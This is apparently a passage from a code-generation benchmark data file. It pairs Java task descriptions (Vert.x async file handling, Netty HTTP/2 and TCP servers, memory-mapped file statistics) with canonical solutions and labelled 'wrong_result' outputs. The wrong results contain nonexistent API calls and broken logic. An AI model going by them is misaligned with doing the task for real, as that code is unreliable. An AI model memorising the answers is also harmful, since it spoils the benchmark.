buffers, long position, Handler<AsyncResult<Void>> handler) {\n        AtomicInteger cnt = new AtomicInteger();\n        AtomicBoolean sentFailure = new AtomicBoolean();\n        for (ByteBuffer b: buffers) {\n            int limit = b.limit();\n            doWrite(b, position, limit, ar -> {\n                if (ar.succeeded()) {\n                    if (cnt.incrementAndGet() == buffers.length) {\n                        handler.handle(ar);\n                    }\n                } else {\n                    if (sentFailure.compareAndSet(false, true)) {\n                        handler.handle(ar);\n                    }\n                }\n            });\n            position += limit;\n        }\n    }\n\n    private void doWrite(ByteBuffer buff, long position, long toWrite, Handler<AsyncResult<Void>> handler) {\n        if (toWrite > 0) {\n            writeInternal(buff, position, handler);\n        } else {\n            handler.handle(Future.succeededFuture());\n        }\n    }\n\n    private void writeInternal(ByteBuffer buff, long position, Handler<AsyncResult<Void>> handler) {\n        ch.write(buff, position, null, new CompletionHandler<Integer, Object>() {\n            public void completed(Integer bytesWritten, Object attachment) {\n                long pos = position;\n                if (buff.hasRemaining()) {\n                    pos += bytesWritten;\n                    writeInternal(buff, pos, handler);\n                } else {\n                    context.runOnContext((v) -> {\n                        handler.handle(Future.succeededFuture());\n                    });\n                }\n            }\n\n            public void failed(Throwable exc, Object attachment) {\n                context.runOnContext((v) -> {\n                    handler.handle(Future.failedFuture(exc));\n                });\n            }\n        });\n    }\n\n    private void doRead(Buffer writeBuff, int offset, ByteBuffer buff, long position, Promise<Buffer> promise) {\n        ch.read(buff, position, null, new CompletionHandler<Integer, Object>() {\n            long pos = position;\n\n            private void done() {\n                buff.flip();\n                writeBuff.setBytes(offset, buff);\n                buff.compact();\n                promise.complete(writeBuff);\n            }\n\n            public void completed(Integer bytesRead, Object attachment) {\n                if (bytesRead == -1) {\n                    done();\n                } else if (buff.hasRemaining()) {\n                    pos += bytesRead;\n                    doRead(writeBuff, offset, buff, pos, promise);\n                } else {\n                    done();\n                }\n            }\n\n            public void failed(Throwable t, Object attachment) {\n                promise.fail(t);\n            }\n        });\n    }\n\n    private void check() {\n        if (closed) {\n            throw new IllegalStateException(\"File handle is closed\");\n        }\n    }\n\n    private void closeInternal(Promise<Void> handler) {\n        check();\n        closed = true;\n        context.<Void>executeBlockingInternal(() -> {\n            ch.close();\n            return null;\n        }).onComplete(handler);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "wrong_result": "import java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.file.*;\nimport java.util.concurrent.CompletionHandler;\nimport io.vertx.core.*;\nimport io.vertx.core.buffer.Buffer;\nimport io.vertx.core.promise.Promise;\nimport io.vertx.core.Future;\n\npublic class AsyncFileImpl implements AsyncFile {\n    private final VertxInternal vertx;\n    private final AsynchronousFileChannel ch;\n    private final ContextInternal context;\n    private boolean closed;\n    private long writePos;\n    private int readBufferSize = 8192;\n    private Handler<Buffer> handler;\n    private Handler<Void> endHandler;\n    private long readPos;\n    private long readLength = Long.MAX_VALUE;\n\n    public AsyncFileImpl(VertxInternal vertx, String path, OpenOptions options, ContextInternal context) {\n        this.vertx = vertx;\n        this.context = context;\n        try {\n            ch = AsynchronousFileChannel.open(Paths.get(path), options);\n        } catch (IOException e) {\n            // Handle exception, perhaps via a promise\n            // For simplicity, assume it's handled in the context\n        }\n    }\n\n    public Future<Void> close() {\n        Promise<Void> promise = Promise.promise();\n        closeInternal(promise);\n        return promise.future();\n    }\n\n    private void closeInternal(Promise<Void> handler) {\n        if (closed) {\n            handler.complete();\n            return;\n        }\n        closed = true;\n        try {\n            ch.close();\n            handler.complete();\n        } catch (Exception e) {\n            handler.fail(e);\n        }\n    }\n\n    public Future<Buffer> read(Buffer buffer, int offset, long position, int length) {\n        Promise<Buffer> promise = Promise.promise();\n        doRead(buffer, offset, buffer, position, promise);\n        return promise.future();\n    }\n\n    private void doRead(Buffer writeBuff, int offset, ByteBuffer buff, long position, Promise<Buffer> promise) {\n        byte[] bytes = writeBuff.array();\n        int len = Math.min(length, bytes.length - offset);\n        ByteBuffer readBuff = ByteBuffer.wrap(bytes, offset, len);\n        ch.read(readBuff, position, new CompletionHandler<Integer, Object>() {\n            @Override\n            public void completed(Integer result, Object attachment) {\n                if (result == null) {\n                    promise.fail(new IOException(\"Read failed\"));\n                    return;\n                }\n                if (result < 0) {\n                    if (endHandler != null) {\n                        endHandler.handle(null);\n                    }\n                    promise.complete(writeBuff);\n                    return;\n                }\n                promise.complete(writeBuff);\n            }\n\n            @Override\n            public void failed(Throwable t, Object attachment) {\n                promise.fail(t);\n            }\n        });\n    }\n\n    public Future<Void> write(Buffer buffer, long position) {\n        Promise<Void> promise = Promise.promise();\n        doWrite(buffer, position, promise);\n        return promise.future();\n    }\n\n    private void doWrite(Buffer buffer, long position, Promise<Void> handler) {\n        byte[] bytes = buffer.array();\n        ByteBuffer buff = ByteBuffer.wrap(bytes);\n        ch.write(buff, position, new CompletionHandler<Integer, Object>() {\n            @Override\n            public void completed(Integer result, Object attachment) {\n                if (result == null) {\n                    handler.fail(new IOException(\"Write failed\"));\n                    return;\n                }\n                handler.complete();\n            }\n\n            @Override\n            public void failed(Throwable t, Object attachment) {\n                handler.fail(t);\n            }\n        });\n    }\n\n    private void doWrite(ByteBuffer[] buffers, long position, Handler<AsyncResult<Void>> handler) {\n        // Implementation for writing multiple buffers\n    }\n\n    private void doWrite(ByteBuffer buff, long position, long toWrite, Handler<AsyncResult<Void>> handler) {\n        // Implementation for writing a portion of a buffer\n    }\n\n    private void writeInternal(ByteBuffer buff, long position, Handler<AsyncResult<Void>> handler) {\n        ch.write(buff, position, new CompletionHandler<Integer, Object>() {\n            @Override\n            public void completed(Integer result, Object attachment) {\n                if (result == null) {\n                    handler.handle(Future.failedFuture(new IOException(\"Write failed\")));\n                    return;\n                }\n                handler.handle(Future.successful(null));\n            }\n\n            @Override\n            public void failed(Throwable t, Object attachment) {\n                handler.handle(Future.failedFuture(t));\n            }\n        });\n    }\n\n    private void check() {\n        if (closed) {\n            throw new IllegalStateException(\"File is closed\");\n        }\n    }\n}"
  },
  {
    "Task_id": 186,
    "Instruction": "Task Description: Implement an abstract HTTP/2 server transport class using Java Netty framework that handles TCP communication, manages server lifecycle (start/stop), and supports SSL encryption.\n\nClass Description: AbstractHttp2ServerTransport is an abstract base class for creating HTTP/2 server transports using Netty. It manages server bootstrap configuration, event loop groups, and provides core server functionality including SSL support and connection management.\n\nAttributes:\n- LOGGER: Logger - Logger instance for logging server events and errors\n- serverBootstrap: ServerBootstrap - Netty server bootstrap instance for configuring and starting the server\n- bizGroup: EventLoopGroup - Event loop group for handling business logic and I/O operations\n- transportConfig: ServerTransportConfig - Configuration object containing server parameters like host, port, and various TCP options\n\nMethods:\n- AbstractHttp2ServerTransport(ServerTransportConfig transportConfig) -> None - Constructor that initializes the transport with configuration\n- start() -> boolean - Starts the HTTP/2 server, initializes event loop groups, configures server bootstrap with TCP options and handlers, and binds to the specified host/port. Returns true if successful\n- stop() -> None - Shuts down the server gracefully, closing event loop groups and releasing resources\n- (inherited methods from ServerTransport superclass would be listed here if applicable)\n\nInput:\n- For constructor: ServerTransportConfig object containing server configuration parameters\n- For start(): None (uses internal state)\n- For stop(): None (uses internal state)\n\nOutput:\n- For start(): boolean indicating success/failure of server startup\n- For stop(): None (performs cleanup operations)",
    "Canonical_solution": "import com.alipay.sofa.rpc.core.exception.SofaRpcRuntimeException;\nimport com.alipay.sofa.rpc.log.LogCodes;\nimport com.alipay.sofa.rpc.log.Logger;\nimport com.alipay.sofa.rpc.log.LoggerFactory;\nimport com.alipay.sofa.rpc.server.http.HttpServerHandler;\nimport com.alipay.sofa.rpc.transport.ServerTransport;\nimport com.alipay.sofa.rpc.transport.ServerTransportConfig;\nimport com.alipay.sofa.rpc.transport.netty.NettyHelper;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelFutureListener;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.WriteBufferWaterMark;\nimport io.netty.channel.epoll.EpollServerSocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\nimport io.netty.handler.ssl.SslContext;\n\nimport java.net.InetSocketAddress;\n\npublic abstract class AbstractHttp2ServerTransport extends ServerTransport {\n\n    private static final Logger LOGGER = LoggerFactory.getLogger(AbstractHttp2ServerTransport.class);\n\n    private volatile ServerBootstrap serverBootstrap;\n    private EventLoopGroup bizGroup;\n\n    protected AbstractHttp2ServerTransport(ServerTransportConfig transportConfig) {\n        super(transportConfig);\n    }\n\n    @Override\n    public boolean start() {\n        if (serverBootstrap != null) {\n            return true;\n        }\n        synchronized (this) {\n            if (serverBootstrap != null) {\n                return true;\n            }\n            boolean flag = false;\n            SslContext sslCtx = SslContextBuilder.build();\n\n            EventLoopGroup bossGroup = NettyHelper.getServerBossEventLoopGroup(transportConfig);\n            HttpServerHandler httpServerHandler = (HttpServerHandler) transportConfig.getServerHandler();\n            bizGroup = NettyHelper.getServerBizEventLoopGroup(transportConfig, httpServerHandler.getBizThreadPool());\n\n            serverBootstrap = new ServerBootstrap();\n            serverBootstrap.group(bossGroup, bizGroup)\n                .channel(transportConfig.isUseEpoll() ? EpollServerSocketChannel.class : NioServerSocketChannel.class)\n                .option(ChannelOption.SO_BACKLOG, transportConfig.getBacklog())\n                .option(ChannelOption.SO_REUSEADDR, transportConfig.isReuseAddr())\n                .option(ChannelOption.RCVBUF_ALLOCATOR, NettyHelper.getRecvByteBufAllocator())\n                .option(ChannelOption.ALLOCATOR, NettyHelper.getByteBufAllocator())\n                .childOption(ChannelOption.SO_KEEPALIVE, transportConfig.isKeepAlive())\n                .childOption(ChannelOption.TCP_NODELAY, transportConfig.isTcpNoDelay())\n                .childOption(ChannelOption.SO_RCVBUF, 8192 * 128)\n                .childOption(ChannelOption.SO_SNDBUF, 8192 * 128)\n                .handler(new LoggingHandler(LogLevel.DEBUG))\n                .childOption(ChannelOption.ALLOCATOR, NettyHelper.getByteBufAllocator())\n                .childOption(ChannelOption.WRITE_BUFFER_WATER_MARK, new WriteBufferWaterMark(\n                    transportConfig.getBufferMin(), transportConfig.getBufferMax()))\n                .childHandler(new Http2ServerChannelInitializer(bizGroup, sslCtx,\n                    httpServerHandler, transportConfig.getPayload()));\n\n            ChannelFuture future = serverBootstrap.bind(\n                new InetSocketAddress(transportConfig.getHost(), transportConfig.getPort()));\n            ChannelFuture channelFuture = future.addListener(new ChannelFutureListener() {\n                @Override\n                public void operationComplete(ChannelFuture future) throws Exception {\n                    if (future.isSuccess()) {\n                        if (LOGGER.isInfoEnabled()) {\n                            LOGGER.info(\"HTTP/2 Server bind to {}:{} success!\",\n                                transportConfig.getHost(), transportConfig.getPort());\n                        }\n                    } else {\n                        LOGGER.error(LogCodes.getLog(LogCodes.ERROR_HTTP2_BIND, transportConfig.getHost(),\n                            transportConfig.getPort()));\n                        stop();\n                    }\n                }\n            });\n\n            try {\n                channelFuture.await();\n                if (channelFuture.isSuccess()) {\n                    flag = Boolean.TRUE;\n                } else {\n                    throw new SofaRpcRuntimeException(LogCodes.getLog(LogCodes.ERROR_START_SERVER, \"HTTP/2\"),\n                        future.cause());\n                }\n            } catch (InterruptedException e) {\n                LOGGER.error(e.getMessage(), e);\n            }\n            return flag;\n        }\n    }\n\n    @Override\n    public void stop() {\n        if (LOGGER.isInfoEnabled()) {\n            LOGGER.info(\"Shutdown the SOFA RPC HTTP/2 server transport now...\");\n        }\n        NettyHelper.closeServerBossEventLoopGroup(transportConfig);\n        if (bizGroup != null) {\n            bizGroup.shutdownGracefully();\n        }\n        serverBootstrap = null;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "wrong_result": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.codec.http2.Http2ServerCodec;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\npublic abstract class AbstractHttp2ServerTransport {\n    protected final Logger LOGGER = LoggerFactory.getLogger(AbstractHttp2ServerTransport.class);\n    protected final ServerBootstrap serverBootstrap;\n    protected final EventLoopGroup bizGroup;\n    protected final ServerTransportConfig transportConfig;\n\n    protected AbstractHttp2ServerTransport(ServerTransportConfig transportConfig) {\n        this.transportConfig = transportConfig;\n        this.bizGroup = new NioEventLoopGroup();\n        this.serverBootstrap = new ServerBootstrap();\n        serverBootstrap.group(bizGroup, new NioEventLoopGroup());\n    }\n\n    public boolean start() {\n        try {\n            serverBootstrap.option(ChannelOption.SO_REUSEADDR, true);\n            serverBootstrap.option(ChannelOption.SO_TIMEOUT, transportConfig.getSoTimeout());\n\n            if (transportConfig.isSslEnabled()) {\n                SslContext sslCtx = SslContext.newServerContext(\n                    transportConfig.getSslKeyStorePath(),\n                    transportConfig.getSslKeyStorePassword()\n                );\n                serverBootstrap.handler(new Http2ServerCodec(sslCtx));\n            } else {\n                serverBootstrap.handler(new Http2ServerCodec());\n            }\n\n            ChannelFuture future = serverBootstrap.bind(transportConfig.getHost(), transportConfig.getPort()).sync();\n            future.await();\n            return true;\n        } catch (Exception e) {\n            LOGGER.error(\"Failed to start HTTP/2 server\", e);\n            return false;\n        } finally {\n            if (serverBootstrap != null) {\n                serverBootstrap.close().awaitUninterruptibly();\n            }\n        }\n    }\n\n    public void stop() {\n        if (serverBootstrap != null) {\n            serverBootstrap.close().awaitUninterruptibly();\n        }\n        if (bizGroup != null) {\n            bizGroup.shutdownGracefully();\n        }\n    }\n}"
  },
  {
    "Task_id": 187,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle incoming client connections and process time-related requests.\n\nClass Description: The TimeServer class is a Netty-based TCP server that listens on a specified port for incoming client connections. It uses Netty's event-driven architecture to efficiently handle multiple concurrent connections. The server processes incoming requests through a pipeline of handlers and responds with time-related information.\n\nAttributes:\nport: int - The port number on which the server will listen for incoming connections\n\nMethods:\nconstructor: TimeServer(int port) -> void - Initializes the server with the specified port number\nrun: run() -> void - Starts the server, binds it to the specified port, and begins accepting client connections. This method handles the server's lifecycle including startup, operation, and graceful shutdown. Throws Exception if any error occurs during server operation.",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\n\npublic class TimeServer {\n\n    private int port;\n\n    public TimeServer(int port) {\n        this.port = port;\n    }\n\n    public void run() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) throws Exception {\n                     ch.pipeline().addLast(new TimeEncoder());\n                     ch.pipeline().addLast(new TimeServerHandler());\n                 }\n             })\n             .option(ChannelOption.SO_BACKLOG, 128)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = b.bind(port).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "wrong_result": "public class TimeServer {\n    private int port;\n\n    public TimeServer(int port) {\n        this.port = port;\n    }\n\n    public void run() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n\n        try {\n            ServerBootstrap bootstrap = new ServerBootstrap();\n            bootstrap.group(bossGroup, workerGroup)\n                     .channel(NioServerSocketChannel.class)\n                     .childHandler(new ChannelInitializer<SocketChannel>() {\n                         @Override\n                         protected void initChannel(SocketChannel ch) {\n                             ChannelPipeline pipeline = ch.pipeline();\n                             pipeline.addLast(new StringDecoder());\n                             pipeline.addLast(new TimeServerHandler());\n                         }\n                     })\n                     .childOption(ChannelOption.SO_REUSEADDR, true)\n                     .option(ChannelOption.SO_BACKLOG, 100);\n\n            ChannelFuture future = bootstrap.bind(port).sync();\n\n            future.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n\n    static class TimeServerHandler extends ChannelInboundHandlerAdapter {\n        @Override\n        public void channelRead(ChannelHandlerContext ctx, Object msg) {\n            if (msg instanceof String) {\n                String request = (String) msg;\n                String response = new java.util.Date().toString();\n                ctx.writeAndFlush(response);\n            } else {\n                ctx.close();\n            }\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 19,
    "Instruction": "Task Description: Implement a Java class that processes large files efficiently using memory-mapped file operations (FileChannel and MappedByteBuffer) to calculate statistics (min, max, sum, count) for numeric values associated with named fields in the file.\n\nClass Description: FileChannelProcessor is a utility class that processes large files in chunks using memory-mapped buffers, calculating statistics for named numeric values in a thread-safe manner using concurrent data structures.\n\nAttributes:\n- mins: ConcurrentHashMap<ByteBuffer, Integer> - Stores minimum values for each named field\n- maxs: ConcurrentHashMap<ByteBuffer, Integer> - Stores maximum values for each named field\n- sums: ConcurrentHashMap<ByteBuffer, Integer> - Stores sum of values for each named field\n- counts: ConcurrentHashMap<ByteBuffer, Integer> - Stores count of values for each named field\n\nMethods:\n- processChunk(MappedByteBuffer chunk, long chunkSize) -> void - Processes a memory-mapped file chunk to calculate statistics for named numeric values\n  - Input Parameters:\n    - chunk: MappedByteBuffer - Memory-mapped buffer containing file data\n    - chunkSize: long - Size of the chunk to process\n- processFile(Path filePath) -> void - Processes the entire file by dividing it into chunks and calculating statistics\n  - Input Parameters:\n    - filePath: Path - Path to the file to be processed\n  - Throws: IOException - If there are file I/O errors",
    "Canonical_solution": "import java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.MappedByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Path;\nimport java.util.HashMap;\nimport java.util.IntSummaryStatistics;\nimport java.util.concurrent.ConcurrentHashMap;\n\npublic class FileChannelProcessor {\n\n    private static final ConcurrentHashMap<ByteBuffer, Integer> mins = new ConcurrentHashMap<>();\n    private static final ConcurrentHashMap<ByteBuffer, Integer> maxs = new ConcurrentHashMap<>();\n    private static final ConcurrentHashMap<ByteBuffer, Integer> sums = new ConcurrentHashMap<>();\n    private static final ConcurrentHashMap<ByteBuffer, Integer> counts = new ConcurrentHashMap<>();\n\n    public static void processChunk(MappedByteBuffer chunk, long chunkSize) {\n        chunk.load();\n        HashMap<ByteBuffer, IntSummaryStatistics> values = new HashMap<>();\n\n        long end = chunk.position() + chunkSize;\n        int value = 0;\n        byte b = 0;\n        boolean negate = false;\n        long nameStart = 0;\n        long nameEnd = 0;\n        int nameLength = 0;\n        while (chunk.position() < end) {\n            nameStart = chunk.position();\n            b = chunk.get();\n            while (b != ';') {\n                b = chunk.get();\n            }\n            nameEnd = chunk.position() - 1;\n            nameLength = (int) (nameEnd - nameStart);\n            ByteBuffer nameBuffer = ByteBuffer.allocate(nameLength);\n            chunk.get(chunk.position() - nameLength - 1, nameBuffer.array(), 0, nameLength);\n\n            value = 0;\n            b = chunk.get();\n            negate = false;\n            while (b != '\\n') {\n                if (b == '.') {\n                    b = chunk.get();\n                    continue;\n                }\n                else if (b == '-') {\n                    negate = true;\n                    b = chunk.get();\n                    continue;\n                }\n                value = value * 10 + (b - '0');\n                b = chunk.get();\n            }\n            if (negate) {\n                value = -value;\n            }\n\n            if (values.containsKey(nameBuffer)) {\n                values.get(nameBuffer).accept(value);\n            }\n            else {\n                IntSummaryStatistics stats = new IntSummaryStatistics();\n                stats.accept(value);\n                values.put(nameBuffer, stats);\n            }\n        }\n\n        for (ByteBuffer nameBfr : values.keySet()) {\n            IntSummaryStatistics stats = values.get(nameBfr);\n            mins.compute(nameBfr, (k, v) -> v == null ? stats.getMin() : Math.min(v, stats.getMin()));\n            maxs.compute(nameBfr, (k, v) -> v == null ? stats.getMax() : Math.max(v, stats.getMax()));\n            sums.compute(nameBfr, (k, v) -> v == null ? (int) stats.getSum() : (v + (int) stats.getSum()));\n            counts.compute(nameBfr, (k, v) -> v == null ? (int) stats.getCount() : (v + (int) stats.getCount()));\n        }\n    }\n\n    public static void processFile(Path filePath) throws IOException {\n        FileChannel fc = FileChannel.open(filePath);\n        long fileSize = fc.size();\n        int numProcessors = Runtime.getRuntime().availableProcessors();\n        int numChunks = numProcessors * 2000;\n        long chunkLimit = fileSize / numChunks;\n        long chunkStart = 0;\n        long chunkEnd = chunkLimit;\n        ByteBuffer bb = ByteBuffer.allocateDirect(128);\n\n        while (chunkEnd < fileSize) {\n            fc.position(chunkEnd);\n            bb.clear();\n            fc.read(bb);\n            bb.flip();\n            while (bb.get() != '\\n' && bb.position() < bb.limit()) {\n            }\n            chunkEnd = chunkEnd + bb.position();\n            if (chunkEnd > fileSize) {\n                chunkEnd = fileSize - 1;\n            }\n\n            long chunkSize = chunkEnd - chunkStart;\n            if (chunkSize < 1) {\n                break;\n            }\n\n            MappedByteBuffer chunk = fc.map(FileChannel.MapMode.READ_ONLY, chunkStart, chunkSize);\n            processChunk(chunk, chunkSize);\n            chunkStart = chunkEnd;\n            chunkEnd = chunkEnd + chunkLimit;\n            if (chunkEnd > fileSize) {\n                chunkEnd = fileSize - 1;\n            }\n        }\n        fc.close();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "wrong_result": "import java.io.IOException;\nimport java.nio.MappedByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Path;\nimport java.util.concurrent.ConcurrentHashMap;\nimport java.nio.charset.StandardCharsets;\n\npublic class FileChannelProcessor {\n    private final ConcurrentHashMap<ByteBuffer, Integer> mins = new ConcurrentHashMap<>();\n    private final ConcurrentHashMap<ByteBuffer, Integer> maxs = new ConcurrentHashMap<>();\n    private final ConcurrentHashMap<ByteBuffer, Integer> sums = new ConcurrentHashMap<>();\n    private final ConcurrentHashMap<ByteBuffer, Integer> counts = new ConcurrentHashMap<>();\n\n    public void processChunk(MappedByteBuffer chunk, long chunkSize) {\n        ByteBuffer buf = chunk.slice();\n        buf.position(0);\n\n        while (buf.hasRemaining()) {\n            int nameLength = 0;\n            while (nameLength < buf.remaining() && buf.get(nameLength) != 0) {\n                nameLength++;\n            }\n            if (nameLength > 0) {\n                String fieldName = new String(buf.array(), 0, nameLength, StandardCharsets.UTF_8);\n                buf.position(buf.position() + nameLength + 1);\n\n                int value = buf.getInt();\n\n                ByteBuffer key = ByteBuffer.wrap(fieldName.getBytes(StandardCharsets.UTF_8));\n\n                Integer currentMin = mins.get(key);\n                if (currentMin == null || value < currentMin) {\n                    mins.put(key, value);\n                }\n\n                Integer currentMax = maxs.get(key);\n                if (currentMax == null || value > currentMax) {\n                    maxs.put(key, value);\n                }\n\n                Integer currentSum = sums.get(key);\n                if (currentSum == null) {\n                    sums.put(key, value);\n                } else {\n                    sums.put(key, currentSum + value);\n                }\n\n                Integer currentCount = counts.get(key);\n                if (currentCount == null) {\n                    counts.put(key, 1);\n                } else {\n                    counts.put(key, currentCount + 1);\n                }\n            } else {\n                break;\n            }\n        }\n    }\n\n    public void processFile(Path filePath) throws IOException {\n        try (FileChannel channel = FileChannel.open(filePath, java.nio.file.StandardOpenOption.READ)) {\n            long fileSize = channel.size();\n            long chunkSize = 1024 * 1024;\n\n            MappedByteBuffer mappedBuffer = channel.map(java.nio.channels.FileChannel.MapMode.READ_ONLY, 0, fileSize);\n\n            long remaining = fileSize;\n            long start = 0;\n            while (remaining > 0) {\n                long end = Math.min(start + chunkSize, fileSize);\n                MappedByteBuffer chunk = mappedBuffer.slice();\n                chunk.position(start);\n                chunk.limit(end);\n                processChunk(chunk, chunkSize);\n                start = end;\n                remaining = fileSize - start;\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 191,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle HTTP requests and responses.\n\nClass Description: The NettyTcpServer class provides functionality to start and stop a Netty-based TCP server that listens for HTTP requests on a specified port and responds with a predefined message. It manages server resources and lifecycle.\n\nAttributes:\n- ctx: ApplicationContext - The Micronaut application context for dependency injection and configuration\n- serverLoop: EventLoopGroup - The Netty event loop group that handles server I/O operations\n- server: ServerSocketChannel - The server socket channel that listens for incoming connections\n\nMethods:\n- startServer(int port) -> void - Starts the TCP server on the specified port. Initializes the server with an event loop group, configures the channel pipeline with HTTP codec and handler, and binds to the given port.\n  Input: port (int) - The port number to bind the server to\n  Output: None (throws Exception if server fails to start)\n\n- stopServer() -> void - Stops the server gracefully by shutting down the event loop group and closing the application context.\n  Input: None\n  Output: None\n\n- getPort() -> int - Returns the port number the server is bound to, or -1 if the server is not running.\n  Input: None\n  Output: int - The port number or -1 if server is not active",
    "Canonical_solution": "import io.micronaut.context.ApplicationContext;\nimport io.micronaut.http.HttpRequest;\nimport io.micronaut.http.body.CloseableAvailableByteBody;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.buffer.ByteBuf;\nimport io.netty.buffer.ByteBufAllocator;\nimport io.netty.buffer.ByteBufUtil;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelHandlerContext;\nimport io.netty.channel.ChannelInboundHandlerAdapter;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.ServerSocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.DefaultFullHttpResponse;\nimport io.netty.handler.codec.http.DefaultHttpHeaders;\nimport io.netty.handler.codec.http.EmptyHttpHeaders;\nimport io.netty.handler.codec.http.FullHttpResponse;\nimport io.netty.handler.codec.http.HttpContent;\nimport io.netty.handler.codec.http.HttpHeaderNames;\nimport io.netty.handler.codec.http.HttpResponseStatus;\nimport io.netty.handler.codec.http.HttpServerCodec;\nimport io.netty.handler.codec.http.HttpVersion;\nimport io.netty.handler.codec.http.LastHttpContent;\nimport java.util.Map;\n\npublic class NettyTcpServer {\n\n    private ApplicationContext ctx;\n    private EventLoopGroup serverLoop;\n    private ServerSocketChannel server;\n\n    public void startServer(int port) throws Exception {\n        ctx = ApplicationContext.run(Map.of(\"spec.name\", \"NettyTcpServer\"));\n        serverLoop = new NioEventLoopGroup(1);\n        server = (ServerSocketChannel) new ServerBootstrap()\n            .group(serverLoop)\n            .channel(NioServerSocketChannel.class)\n            .localAddress(port)\n            .childHandler(new ChannelInitializer<>() {\n                FullHttpResponse response;\n\n                @Override\n                public void handlerAdded(ChannelHandlerContext ctx) {\n                    ByteBuf resp = ctx.alloc().buffer();\n                    ByteBufUtil.writeAscii(resp, \"bar\");\n                    response = new DefaultFullHttpResponse(\n                        HttpVersion.HTTP_1_1, \n                        HttpResponseStatus.OK, \n                        resp, \n                        new DefaultHttpHeaders().add(HttpHeaderNames.CONTENT_LENGTH, resp.readableBytes()), \n                        EmptyHttpHeaders.INSTANCE\n                    );\n                }\n\n                @Override\n                protected void initChannel(@NonNull Channel ch) {\n                    ch.pipeline()\n                        .addLast(new HttpServerCodec())\n                        .addLast(new ChannelInboundHandlerAdapter() {\n                            boolean inBody = false;\n\n                            @Override\n                            public void channelRead(@NonNull ChannelHandlerContext ctx, @NonNull Object msg) throws Exception {\n                                if (!inBody) {\n                                    inBody = true;\n                                    if (!(msg instanceof FullHttpResponse)) {\n                                        return;\n                                    }\n                                }\n                                ((HttpContent) msg).release();\n                                if (msg instanceof LastHttpContent) {\n                                    ctx.writeAndFlush(new DefaultFullHttpResponse(\n                                        response.protocolVersion(),\n                                        response.status(),\n                                        response.content().retainedSlice(),\n                                        response.headers(),\n                                        response.trailingHeaders()\n                                    ));\n                                    inBody = false;\n                                }\n                            }\n                        });\n                }\n            })\n            .bind().syncUninterruptibly().channel();\n    }\n\n    public void stopServer() {\n        if (serverLoop != null) {\n            serverLoop.shutdownGracefully();\n        }\n        if (ctx != null) {\n            ctx.close();\n        }\n    }\n\n    public int getPort() {\n        return server != null ? server.localAddress().getPort() : -1;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "wrong_result": "public class NettyTcpServer {\n    private final ApplicationContext ctx;\n    private EventLoopGroup serverLoop;\n    private ServerSocketChannel server;\n\n    public NettyTcpServer(ApplicationContext ctx) {\n        this.ctx = ctx;\n    }\n\n    public void startServer(int port) throws Exception {\n        serverLoop = new NioEventLoopGroup();\n        server = ServerSocketChannel.open();\n        server.socket().bind(new InetSocketAddress(port));\n\n        ServerBootstrap b = new ServerBootstrap();\n        b.group(serverLoop)\n         .channel(NioServerSocketChannel.class)\n         .childHandler(new ChannelInitializer<SocketChannel>() {\n             @Override\n             protected void initChannel(SocketChannel ch) {\n                 ChannelPipeline p = ch.pipeline();\n                 p.addLast(new HttpServerCodec());\n                 p.addLast(new HttpObjectAggregator(1024));\n                 p.addLast(new MyHttpHandler());\n             }\n         })\n         .bind(port);\n    }\n\n    public void stopServer() {\n        if (serverLoop != null) {\n            serverLoop.shutdownGracefully();\n        }\n        if (ctx != null) {\n            ctx.close();\n        }\n    }\n\n    